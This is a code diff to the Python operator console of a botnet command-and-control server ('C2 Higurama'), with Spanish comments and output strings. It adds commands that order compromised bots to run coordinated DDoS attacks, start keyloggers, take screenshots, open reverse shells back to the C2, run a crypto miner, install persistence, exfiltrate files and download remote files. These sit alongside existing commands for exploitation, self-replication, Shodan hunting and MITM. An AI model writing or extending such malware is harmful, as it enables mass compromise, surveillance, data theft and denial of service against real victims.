@@ -18,7 +18,7 @@ except ImportError:
     # Fallback si no existe banner.py
     CUSTOM_BANNER = r"""
     ╔═══════════════════════════════════════════════════════════╗
-    ║                   C2 COMMAND CENTER                       ║
+    ║                   C2 Higurama          ║
     ╚═══════════════════════════════════════════════════════════╝
     """
     def center_ascii(text):
@@ -102,7 +102,10 @@ class Effects:
     def progress_bar(current, total, width=50, message="Progreso"):
         """Barra de progreso animada."""
         import sys
-        percentage = current / total
+        if total == 0:
+            percentage = 0
+        else:
+            percentage = current / total
         filled = int(width * percentage)
         
         bar = '█' * filled + '░' * (width - filled)
@@ -239,7 +242,10 @@ def handle_bot_connection(client_socket, addr):
                     # Animación de recepción
                     host_count = len(message['live_hosts'])
                     print(f"\n{Colors.YELLOW}📊 INFORME RECIBIDO DE {Colors.BOLD}{bot_id}{Colors.RESET}")
-                    Effects.progress_bar(host_count, host_count, message=f"{host_count} hosts encontrados")
+                    if host_count > 0:
+                        Effects.progress_bar(host_count, host_count, message=f"{host_count} hosts encontrados")
+                    else:
+                        print(f"{Colors.RED}[!] No se encontraron hosts vulnerables{Colors.RESET}")
                     print()
                 
                 elif message['action'] == 'shodan_report':
@@ -358,16 +364,30 @@ def command_interface():
             bot_info = bots[bot_id]['info']
             print(f"  \033[96m{i}.\033[0m {bot_id} [\033[93m{bot_info['os']}/{bot_info['arch']}\033[0m]")
             
-        print("\n\033[95m⚡ COMANDOS DISPONIBLES:\033[0m")
+        print("\n\033[95m⚡ COMANDOS BÁSICOS:\033[0m")
         print(f"  {Colors.GREEN}list <num>{Colors.RESET}        - Listar vulnerabilidades del bot #num")
         print(f"  {Colors.GREEN}exploit <bot> <host>{Colors.RESET} - Explotar host manualmente")
         print(f"  {Colors.GREEN}auto_rep <bot> on/off{Colors.RESET} - Toggle auto-replicación")
-        print(f"  {Colors.GREEN}shodan <bot> <api_key>{Colors.RESET} - Iniciar caza global con Shodan")
-        print(f"  {Colors.GREEN}shodan_stop <bot>{Colors.RESET} - Detener caza Shodan")
-        print(f"  {Colors.GREEN}mitm <bot>{Colors.RESET}        - Iniciar ataque MITM")
-        print(f"  {Colors.GREEN}mitm_stop <bot>{Colors.RESET}  - Detener ataque MITM")
-        print(f"  {Colors.GREEN}recon <num>{Colors.RESET}       - Ordenar reconocimiento (auto-explota si está ON)")
+        print(f"  {Colors.GREEN}recon <num>{Colors.RESET}       - Ordenar reconocimiento (escaneo global)")
         print(f"  {Colors.GREEN}status{Colors.RESET}            - Mostrar estado de todos los bots")
+        
+        print(f"\n\033[95m🔥 ATAQUES AVANZADOS:\033[0m")
+        print(f"  {Colors.RED}ddos <bot> <ip> <port>{Colors.RESET} - Ataque DDoS coordinado")
+        print(f"  {Colors.RED}keylog <bot>{Colors.RESET}       - Activar keylogger")
+        print(f"  {Colors.RED}screenshot <bot>{Colors.RESET}   - Capturar pantalla")
+        print(f"  {Colors.RED}shell <bot>{Colors.RESET}        - Shell reversa")
+        print(f"  {Colors.RED}mine <bot>{Colors.RESET}         - Crypto miner (simulado)")
+        print(f"  {Colors.RED}persist <bot>{Colors.RESET}      - Instalar persistencia")
+        
+        print(f"\n\033[95m📁 ARCHIVOS:\033[0m")
+        print(f"  {Colors.CYAN}upload <bot> <path>{Colors.RESET} - Subir archivo del bot")
+        print(f"  {Colors.CYAN}download <bot> <url> <dest>{Colors.RESET} - Descargar archivo al bot")
+        
+        print(f"\n\033[95m🌍 HUNTING:\033[0m")
+        print(f"  {Colors.YELLOW}shodan <bot> <api_key>{Colors.RESET} - Caza global con Shodan")
+        print(f"  {Colors.YELLOW}shodan_stop <bot>{Colors.RESET} - Detener caza Shodan")
+        print(f"  {Colors.YELLOW}mitm <bot>{Colors.RESET}        - Ataque MITM")
+        print(f"  {Colors.YELLOW}mitm_stop <bot>{Colors.RESET}  - Detener MITM")
         print(f"\n  {Colors.CYAN}🌐 GESTIÓN DE C2 SERVERS:{Colors.RESET}")
         print(f"  {Colors.GREEN}c2 list{Colors.RESET}           - Listar todos los C2s configurados")
         print(f"  {Colors.GREEN}c2 add <ip> [port]{Colors.RESET} - Agregar C2 comprometido")
@@ -594,6 +614,104 @@ def command_interface():
                 print(f"\033[93m[*] Deteniendo caza Shodan...\033[0m")
             except (IndexError, ValueError, KeyError):
                 print("\033[91m[!] Uso: shodan_stop <bot_num>\033[0m")
+        
+        # ═══ NUEVOS COMANDOS AVANZADOS ═══
+        elif choice.startswith('ddos '):
+            try:
+                parts = choice.split()
+                bot_num = int(parts[1])
+                target_ip = parts[2]
+                target_port = int(parts[3]) if len(parts) > 3 else 80
+                duration = int(parts[4]) if len(parts) > 4 else 60
+                
+                bot_id = list(bots.keys())[bot_num-1]
+                command = {
+                    'action': 'ddos',
+                    'target': target_ip,
+                    'port': target_port,
+                    'duration': duration
+                }
+                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
+                print(f"\033[91m[*] DDoS iniciado contra {target_ip}:{target_port} por {duration}s\033[0m")
+            except (IndexError, ValueError, KeyError):
+                print("\033[91m[!] Uso: ddos <bot_num> <target_ip> <port> [duration]\033[0m")
+        
+        elif choice.startswith('keylog '):
+            try:
+                num = int(choice.split()[1])
+                bot_id = list(bots.keys())[num-1]
+                command = {'action': 'keylogger_start'}
+                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
+                print(f"\033[92m[*] Keylogger activado en bot #{num}\033[0m")
+            except (IndexError, ValueError, KeyError):
+                print("\033[91m[!] Uso: keylog <bot_num>\033[0m")
+        
+        elif choice.startswith('screenshot '):
+            try:
+                num = int(choice.split()[1])
+                bot_id = list(bots.keys())[num-1]
+                command = {'action': 'screenshot'}
+                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
+                print(f"\033[92m[*] Capturando pantalla...\033[0m")
+            except (IndexError, ValueError, KeyError):
+                print("\033[91m[!] Uso: screenshot <bot_num>\033[0m")
+        
+        elif choice.startswith('shell '):
+            try:
+                num = int(choice.split()[1])
+                bot_id = list(bots.keys())[num-1]
+                command = {'action': 'reverse_shell', 'c2_ip': HOST}
+                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
+                print(f"\033[92m[*] Shell reversa iniciada (escucha en puerto 4444)\033[0m")
+            except (IndexError, ValueError, KeyError):
+                print("\033[91m[!] Uso: shell <bot_num>\033[0m")
+        
+        elif choice.startswith('mine '):
+            try:
+                num = int(choice.split()[1])
+                bot_id = list(bots.keys())[num-1]
+                command = {'action': 'mine'}
+                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
+                print(f"\033[92m[*] Crypto miner activado (simulado)\033[0m")
+            except (IndexError, ValueError, KeyError):
+                print("\033[91m[!] Uso: mine <bot_num>\033[0m")
+        
+        elif choice.startswith('persist '):
+            try:
+                num = int(choice.split()[1])
+                bot_id = list(bots.keys())[num-1]
+                command = {'action': 'persist'}
+                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
+                print(f"\033[92m[*] Instalando persistencia...\033[0m")
+            except (IndexError, ValueError, KeyError):
+                print("\033[91m[!] Uso: persist <bot_num>\033[0m")
+        
+        elif choice.startswith('upload '):
+            try:
+                parts = choice.split(maxsplit=2)
+                num = int(parts[1])
+                file_path = parts[2]
+                
+                bot_id = list(bots.keys())[num-1]
+                command = {'action': 'upload', 'file_path': file_path}
+                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
+                print(f"\033[92m[*] Solicitando upload de {file_path}...\033[0m")
+            except (IndexError, ValueError, KeyError):
+                print("\033[91m[!] Uso: upload <bot_num> <file_path>\033[0m")
+        
+        elif choice.startswith('download '):
+            try:
+                parts = choice.split()
+                num = int(parts[1])
+                url = parts[2]
+                dest = parts[3] if len(parts) > 3 else '/tmp/download'
+                
+                bot_id = list(bots.keys())[num-1]
+                command = {'action': 'download', 'url': url, 'dest': dest}
+                bots[bot_id]['socket'].sendall(json.dumps(command).encode('utf-8'))
+                print(f"\033[92m[*] Descargando {url} a {dest}...\033[0m")
+            except (IndexError, ValueError, KeyError):
+                print("\033[91m[!] Uso: download <bot_num> <url> [dest_path]\033[0m")
         
         elif choice == 'c2 list':
             # Mostrar lista de C2s configurados
